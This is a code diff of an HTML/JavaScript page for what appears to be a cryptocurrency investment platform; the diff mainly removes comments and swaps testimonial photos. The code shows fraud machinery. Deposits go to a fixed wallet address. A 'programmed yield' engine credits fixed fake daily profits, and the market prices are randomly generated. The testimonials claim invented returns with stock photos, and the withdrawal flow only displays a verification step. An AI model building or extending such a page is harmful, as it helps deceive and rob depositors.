@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -734,16 +735,15 @@ var prices={btc:97245,eth:3412,bnb:645,sol:178,xrp:2.34,ada:0.98};
 var verifyTimer=null,verifyCountdown=15;
 
 // ═══ HYBRID DEPOSIT & YIELD SYSTEM — STATE ═══
-var userBalance = 100.00;          // available balance (database-side)
-var totalDeposited = 0;             // lifetime verified deposits
-var userInvestments = [];          // investment records (database-side)
-var pendingDeposit = null;        // in-verification deposit
-var profitCheckTimer = null;      // programmed yield engine
-var verifyPollTimer = null;       // on-chain verification poller
-var currentPlanKey = 'yield';     // currently selected investment plan
-var currentPlanAmount = 1000;    // currently selected investment amount
+var userBalance = 100.00;
+var totalDeposited = 0;
+var userInvestments = [];
+var pendingDeposit = null;
+var profitCheckTimer = null;
+var verifyPollTimer = null;
+var currentPlanKey = 'yield';
+var currentPlanAmount = 1000;
 
-// Hybrid system configuration
 var HYBRID_CONFIG = {
   receiverAddress: '0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db',
   bscScanApi: 'https://api.bscscan.com/api',
@@ -755,7 +755,6 @@ var HYBRID_CONFIG = {
   investmentDurationDays: 30
 };
 
-// Investment plan definitions (matches the UI)
 var PLAN_CONFIG = {
   yield:  { name:'Institutional Yield', minAmount:1000,  maxAmount:9999,   totalRate:0.20, dailyRate:0.20/30, days:30 },
   alpha:  { name:'Strategic Alpha',    minAmount:10000, maxAmount:49999,  totalRate:0.25, dailyRate:0.25/30, days:30 },
@@ -773,16 +772,16 @@ var POOL=[
   {n:'Benjamin Okafor',l:'Nigeria',q:'Withdrew $22,000 after 2 months on Elite plan. Zero delays.',i:'https://images.unsplash.com/photo-1522529599102-193144843571?w=80&h=80&fit=crop&crop=face'},
   {n:'Amara Osei',l:'Ghana',q:'Withdrew $8,500 seamlessly. Signals are incredibly accurate — 92% win rate!',i:'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=80&h=80&fit=crop&crop=face'},
   {n:'Carlos Rivera',l:'Mexico',q:'VIP signals turned $10k into $28k in one month.',i:'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face'},
-  {n:'William Osei',l:'Ghana',q:'Copy trading turned my $15,000 into $46,000 in 3 weeks.',i:'https://images.unsplash.com/photo-1578950435899-d6b7b5c5dbda?w=80&h=80&fit=crop&crop=face'},
+  {n:'William Osei',l:'Ghana',q:'Copy trading turned my $15,000 into $46,000 in 3 weeks.',i:'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=150&h=150&fit=crop&crop=faces'},
   {n:'Priya Sharma',l:'India',q:'Managing $20,000 portfolio from my phone daily. Mobile experience is flawless.',i:'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=80&h=80&fit=crop&crop=face'},
   {n:'Sandra Obi',l:'Port Harcourt',q:'Joined 6 months ago. Total profits: $47,000. Total trust: 100%.',i:'https://images.unsplash.com/photo-1607746882042-944635dfe10e?w=80&h=80&fit=crop&crop=face'},
-  {n:'Zara Ahmed',l:'Pakistan',q:'Platform UI is modern and intuitive. Deposited via BTC in 10 minutes.',i:'https://images.unsplash.com/photo-1609710697446-11f2da603fa5?w=80&h=80&fit=crop&crop=face'},
-  {n:'Fatou Diallo',l:'Senegal',q:'Connected wallet with $25,000. Institutional-grade earnings from day one.',i:'https://images.unsplash.com/photo-1609010697446-11f2da603fa5?w=80&h=80&fit=crop&crop=face'},
+  {n:'Zara Ahmed',l:'Pakistan',q:'Platform UI is modern and intuitive. Deposited via BTC in 10 minutes.',i:'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150&h=150&fit=crop&crop=faces'},
+  {n:'Fatou Diallo',l:'Senegal',q:'Connected wallet with $25,000. Institutional-grade earnings from day one.',i:'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=150&h=150&fit=crop&crop=faces'},
   {n:'Mei Lin',l:'Taiwan',q:'Signal alerts on Telegram are instant. Caught SOL pump for $3,600 profit.',i:'https://images.unsplash.com/photo-1596075780750-81249df16d19?w=80&h=80&fit=crop&crop=face'},
   {n:'Takeshi Yamamoto',l:'Japan',q:'Platform security gives me confidence. $30k invested, $42k returned.',i:'https://images.unsplash.com/photo-1622253692010-333f2da6031d?w=80&h=80&fit=crop&crop=face'},
   {n:'Grace Adeyemi',l:'Nigeria',q:'From $5,000 to $19,000 in 4 weeks on the Premium plan.',i:'https://images.unsplash.com/photo-1607746882042-944635dfe10e?w=80&h=80&fit=crop&crop=face'},
   {n:'Raj Patel',l:'India',q:'$1,800/day in passive earnings. Best investment decision of my life.',i:'https://images.unsplash.com/photo-1568602471122-7832951cc4c5?w=80&h=80&fit=crop&crop=face'},
-  {n:'Ingrid Hansen',l:'Norway',q:'Wallet connection earnings are real. $2,600/day deposited to my balance.',i:'https://images.unsplash.com/photo-1484688493527-670fde05810e?w=80&h=80&fit=crop&crop=face'}
+  {n:'Ingrid Hansen',l:'Norway',q:'Wallet connection earnings are real. $2,600/day deposited to my balance.',i:'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&h=150&fit=crop&crop=faces'}
 ];
 
 window.onload = function(){
@@ -847,7 +846,6 @@ function showGM(t,b,btnTxt,fn,showC){
   document.getElementById('gm-ov').classList.add('open');
 }
 
-// VERIFICATION LOADING (15-second countdown)
 function showVerify(msg,onComplete){
   verifyCountdown=15;
   document.getElementById('verify-title').textContent='Verifying...';
@@ -867,7 +865,6 @@ function showVerify(msg,onComplete){
   },1000);
 }
 
-// DEPOSIT
 function selM(m){
   selM2=m;
   document.querySelectorAll('.meth').forEach(function(b){ b.classList.remove('sel'); });
@@ -909,10 +906,8 @@ function confDep(){
   document.getElementById('proc-net-txt').textContent='Verifying transaction details on the '+w.net+' network.';
   document.getElementById('proc-qty').textContent=depAmt.toFixed(4)+' '+w.ticker;
   var procStatus=document.getElementById('proc-status'); if(procStatus){ procStatus.textContent='Pending'; procStatus.style.color='#22c55e'; procStatus.style.fontWeight='600'; }
-  // 15-second verification loading, then show processing overlay + start on-chain verification
   showVerify('Processing your deposit request. Please wait.',function(){
     document.getElementById('proc-ov').classList.add('open');
-    // Wire the success popup to fire when the user leaves the processing overlay
     var procBackBtn=document.getElementById('proc-back-btn');
     if(procBackBtn){
       procBackBtn.onclick=function(){
@@ -920,12 +915,10 @@ function confDep(){
         document.getElementById('suc-ov').classList.add('open');
       };
     }
-    // STEP 1 — Verify incoming deposit on-chain (hybrid system)
     startDepositVerification();
   });
 }
 
-// ═══ STEP 1: DEPOSIT VERIFICATION (REAL ON-CHAIN) ═══
 function startDepositVerification(){
   pendingDeposit = {
     asset: WA[selM2].asset,
@@ -939,7 +932,6 @@ function startDepositVerification(){
   };
   saveHybridState();
   if(verifyPollTimer) clearInterval(verifyPollTimer);
-  // immediate check
   checkChainForDeposit();
   verifyPollTimer = setInterval(checkChainForDeposit, HYBRID_CONFIG.pollIntervalMs);
 }
@@ -948,7 +940,6 @@ async function checkChainForDeposit(){
   if(!pendingDeposit || pendingDeposit.status !== 'verifying') return;
   try{
     var net = WA[selM2];
-    // Query BscScan for recent token transfers to the receiver address
     if(net.asset === 'USDT' || net.asset === 'BNB'){
       var apiUrl = HYBRID_CONFIG.bscScanApi + '?module=account&action=tokentx&address=' +
         encodeURIComponent(HYBRID_CONFIG.receiverAddress) +
@@ -962,7 +953,6 @@ async function checkChainForDeposit(){
              (tx.tokenSymbol === net.asset || (net.asset==='BNB' && tx.tokenSymbol==='BNB'))){
             var decimals = tx.tokenDecimal || 18;
             var value = parseFloat(tx.value) / Math.pow(10, decimals);
-            // match amount (allow tiny variance)
             if(value >= pendingDeposit.amount * 0.999){
               pendingDeposit.txHash = tx.hash;
               pendingDeposit.confirmations = HYBRID_CONFIG.requiredConfirmations;
@@ -975,12 +965,7 @@ async function checkChainForDeposit(){
         }
       }
     }
-    // For non-BSC assets, admin verification path (proof uploaded)
-  }catch(e){
-    // network error — keep polling
-  }
-  // Fallback: admin/proof verification path — credit after fallback window
-  // (represents admin confirming the uploaded payment proof)
+  }catch(e){}
   var elapsed = Date.now() - pendingDeposit.startTime;
   updateProcStatus('Awaiting on-chain confirmation...');
   if(elapsed > HYBRID_CONFIG.verificationFallbackMs){
@@ -995,16 +980,12 @@ function updateProcStatus(txt){
   if(ps){ ps.textContent = txt; }
 }
 
-// STEP 2 — Credit verified deposit to database + mark available
 function confirmDepositCredited(){
   if(verifyPollTimer){ clearInterval(verifyPollTimer); verifyPollTimer=null; }
   if(!pendingDeposit) return;
-  // Credit the deposit to the user's balance
   userBalance += pendingDeposit.amount;
   totalDeposited += pendingDeposit.amount;
-  // Record in statement (database)
   addStatementItem('deposit', 'Deposit via '+pendingDeposit.asset, pendingDeposit.amount, 'completed', true);
-  // Update processing overlay status to confirmed
   var ps = document.getElementById('proc-status');
   if(ps){ ps.textContent='Confirmed ✓'; ps.style.color='#22c55e'; ps.style.fontWeight='700'; }
   var procTxt = document.getElementById('proc-net-txt');
@@ -1014,7 +995,6 @@ function confirmDepositCredited(){
   updateBalanceDisplays();
 }
 
-// ═══ STEP 3 & 4: PROGRAMMED YIELD SIMULATION (30-DAY CYCLE) ═══
 function investNow(){
   var plan = PLAN_CONFIG[currentPlanKey];
   var amount = currentPlanAmount;
@@ -1023,7 +1003,6 @@ function investNow(){
     showGM('Insufficient Balance','Your balance is $'+userBalance.toFixed(2)+'. You need $'+amount.toLocaleString()+' for this investment.','Deposit Now',function(){ closeGM(); closePS(); showDash('deposit'); },true);
     return;
   }
-  // Deduct principal (locked for the duration)
   userBalance -= amount;
   var investment = {
     id: 'INV'+Date.now(),
@@ -1044,17 +1023,15 @@ function investNow(){
   saveHybridState();
   updateBalanceDisplays();
   closePS();
-  // Start the programmed daily profit engine
   startProfitEngine();
   addStatementItem('investment', plan.name+' Investment', amount, 'active', false);
   showGM('Investment Active! 🎉','Your '+plan.name+' investment of $'+amount.toLocaleString()+' is now active. Programmed profits of $'+investment.dailyProfit.toFixed(2)+'/day will be credited for '+plan.days+' days.','View Dashboard',function(){ closeGM(); showDash('main'); },false);
 }
 
-// Programmed daily profit engine — calculates & credits profit each day for 30 days
 function startProfitEngine(){
   if(profitCheckTimer) clearInterval(profitCheckTimer);
-  processDailyProfits(); // run immediately
-  profitCheckTimer = setInterval(processDailyProfits, 60000); // check every minute
+  processDailyProfits();
+  profitCheckTimer = setInterval(processDailyProfits, 60000);
 }
 
 function processDailyProfits(){
@@ -1066,7 +1043,6 @@ function processDailyProfits(){
     if(inv.status !== 'active') return;
     var elapsedDays = Math.floor((now - inv.startDate) / dayMs);
     if(elapsedDays > inv.days) elapsedDays = inv.days;
-    // Credit any uncredited days (catches up if app was closed)
     while(inv.creditedDays < elapsedDays && inv.creditedDays < inv.days){
       inv.creditedDays++;
       inv.creditedProfit += inv.dailyProfit;
@@ -1074,12 +1050,10 @@ function processDailyProfits(){
       addStatementItem('trade', 'Daily Profit — '+inv.planName, inv.dailyProfit, 'completed', true);
       changed = true;
     }
-    // STEP 4 — Investment maturity after 30 days
     if(inv.creditedDays >= inv.days && inv.status === 'active'){
       inv.status = 'matured';
       inv.maturityDate = now;
-      // Unlock principal + accumulated profits
-      userBalance += inv.amount; // return principal
+      userBalance += inv.amount;
       addStatementItem('investment', inv.planName+' Matured — Principal Unlocked', inv.amount, 'completed', true);
       changed = true;
     }
@@ -1090,12 +1064,10 @@ function processDailyProfits(){
   }
 }
 
-// Render active investments on the dashboard
 function renderActiveInvestments(){
   var section = document.getElementById('active-investments-section');
   if(!section) return;
   var active = userInvestments.filter(function(i){ return i.status==='active'; });
-  var matured = userInvestments.filter(function(i){ return i.status==='matured'; });
   if(!active.length){ section.style.display='none'; section.innerHTML=''; return; }
   section.style.display='block';
   section.innerHTML = active.map(function(inv){
@@ -1119,7 +1091,6 @@ function renderActiveInvestments(){
   }).join('');
 }
 
-// Persist hybrid state to "database" (localStorage)
 function saveHybridState(){
   try{
     localStorage.setItem('vankleff_balance', userBalance.toString());
@@ -1142,7 +1113,6 @@ function loadHybridState(){
   }catch(e){}
 }
 
-// Update all balance displays across the UI
 function updateBalanceDisplays(){
   var formatted = '$' + userBalance.toFixed(2);
   var balEl = document.querySelector('.bal-amount');
@@ -1155,7 +1125,6 @@ function updateBalanceDisplays(){
   if(tfBal) tfBal.textContent = formatted;
   var perfBal = document.getElementById('perf-balance');
   if(perfBal) perfBal.textContent = formatted;
-  // Total profit = sum of credited profits across all investments
   var totalProfit = userInvestments.reduce(function(s,i){ return s + (i.creditedProfit||0); },0);
   var perfProfit = document.getElementById('perf-profit');
   if(perfProfit) perfProfit.textContent = '$'+totalProfit.toFixed(2);
@@ -1168,7 +1137,6 @@ function updateBalanceDisplays(){
   renderActiveInvestments();
 }
 
-// Add a transaction record to the statement (database)
 function addStatementItem(type, title, amount, status, isPositive){
   var list = document.getElementById('stmt-list');
   if(!list) return;
@@ -1182,7 +1150,6 @@ function addStatementItem(type, title, amount, status, isPositive){
   list.insertBefore(item, list.firstChild);
 }
 
-// WITHDRAWAL — 15-second verification then show withdrawal note
 function verifyWithdraw(){
   var otps=document.querySelectorAll('.otp-in');
   var codeEntered=false;
@@ -1193,7 +1160,6 @@ function verifyWithdraw(){
   });
 }
 
-// SIGNALS & PLANS & COPY
 function subSig(p){ showGM('Insufficient Balance','You need $'+p+' but have $'+userBalance.toFixed(2)+'.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); }
 function openPS(t){ currentPlanKey=t; currentPlanAmount=PLAN_CONFIG[t]?PLAN_CONFIG[t].minAmount:1000; document.querySelectorAll('.ps-card').forEach(function(c){ c.classList.remove('on'); }); document.getElementById('plans-list').style.display='none'; document.getElementById('ps-'+t).classList.add('on'); }
 function closePS(){ document.querySelectorAll('.ps-card').forEach(function(c){ c.classList.remove('on'); }); document.getElementById('plans-list').style.display='block'; }
@@ -1202,13 +1168,11 @@ function openCP(n,m){ cpMin=m; document.getElementById('cp-t').textContent='Copy
 function startCopy(){ var a=parseFloat(document.getElementById('cp-amt').value); if(!a||a<cpMin){ alert('Minimum amount is $'+cpMin); return; } if(userBalance < a){ showGM('Insufficient Balance','You need $'+a.toFixed(2)+' but have $'+userBalance.toFixed(2)+'. Deposit to start copy trading.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); return; } document.getElementById('cp-ov').classList.remove('open'); showGM('Copy Trading Started','You are now copying this trader. Profits will reflect in your balance.','View Dashboard',function(){ closeGM(); showDash('main'); },false); }
 function doTransfer(){ var r=document.getElementById('tf-rec').value.trim(),a=parseFloat(document.getElementById('tf-amt').value); if(!r||!a){ alert('Please fill in all fields.'); return; } if(userBalance < a){ alert('Transfer failed. Insufficient balance. Please deposit funds.'); return; } userBalance -= a; saveHybridState(); updateBalanceDisplays(); addStatementItem('transfer','Transfer to '+r,a,'completed',false); alert('Transfer of $'+a.toFixed(2)+' sent successfully.'); }
 
-// PRICE TICKER
 function updPrices(){
   Object.keys(prices).forEach(function(c){ var ch=(Math.random()-0.48)*0.8; prices[c]*=(1+ch/100); var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c); if(pe){ pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4)); if(ce){ ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%'; ce.className=ch>=0?'up':'dn2'; } } });
 }
 setInterval(updPrices,8000);
 
-// MARKETS
 function buildMkts(){
   var w=document.getElementById('mkt-list'); if(!w) return;
   var coins=[{n:'Bitcoin',t:'BTC',p:97245},{n:'Ethereum',t:'ETH',p:3412},{n:'BNB',t:'BNB',p:645},{n:'Solana',t:'SOL',p:178},{n:'XRP',t:'XRP',p:2.34},{n:'Cardano',t:'ADA',p:0.98},{n:'Avalanche',t:'AVAX',p:38.4},{n:'Polkadot',t:'DOT',p:7.8},{n:'Chainlink',t:'LINK',p:14.2},{n:'Litecoin',t:'LTC',p:92.3}];
@@ -1216,7 +1180,6 @@ function buildMkts(){
   coins.forEach(function(c){ var ch=(Math.random()*8-3).toFixed(2); var d=document.createElement('div'); d.className='pr'; d.innerHTML='<div class="pr-l"><div class="pr-ic">'+c.t[0]+'</div><div><div class="pr-nm">'+c.n+'</div><div class="pr-tk">'+c.t+'</div></div></div><div style="text-align:right"><div class="pr-price">$'+parseFloat(c.p).toLocaleString()+'</div><div class="'+(parseFloat(ch)>=0?'up':'dn2')+'">'+(parseFloat(ch)>=0?'▲ +':'▼ ')+Math.abs(ch)+'%</div></div>'; w.appendChild(d); });
 }
 
-// TESTIMONIALS & STORIES
 function buildRotTesti(){
   var w=document.getElementById('rot-test'); if(!w) return;
   var pool=POOL.slice().sort(function(){ return Math.random()-0.5; }).slice(0,12);
@@ -1228,10 +1191,8 @@ function buildStories(){
   POOL.slice().sort(function(){ return Math.random()-0.5; }).forEach(function(t){ var d=document.createElement('div'); d.className='story-card'; d.innerHTML='<img class="st-av" src="'+t.i+'" alt="'+t.n+'"/><div><div style="font-weight:700;font-size:13px;color:#c9a84c;">'+t.n+'</div><div style="font-size:10px;color:#888;margin-bottom:4px;">'+t.l+'</div><div style="color:#f59e0b;font-size:13px;margin-bottom:5px;">★★★★★</div><p style="font-size:12px;color:#e0e0e0;line-height:1.6;font-style:italic;">"'+t.q+'"</p></div>'; w.appendChild(d); });
 }
 
-// STATEMENT FILTER
 function fStmt(type,btn){ document.querySelectorAll('.sfbtn').forEach(function(b){ b.classList.remove('on'); }); btn.classList.add('on'); document.querySelectorAll('#stmt-list .st-item').forEach(function(el){ el.style.display=(type==='all'||el.getAttribute('data-t')===type)?'flex':'none'; }); }
 
-// OTP
 document.addEventListener('DOMContentLoaded',function(){
   document.querySelectorAll('.otp-in').forEach(function(inp,i,all){ inp.addEventListener('input',function(){ if(inp.value.length===1&&i<all.length-1) all[i+1].focus(); }); inp.addEventListener('keydown',function(e){ if(e.key==='Backspace'&&!inp.value&&i>0) all[i-1].focus(); }); });
 });
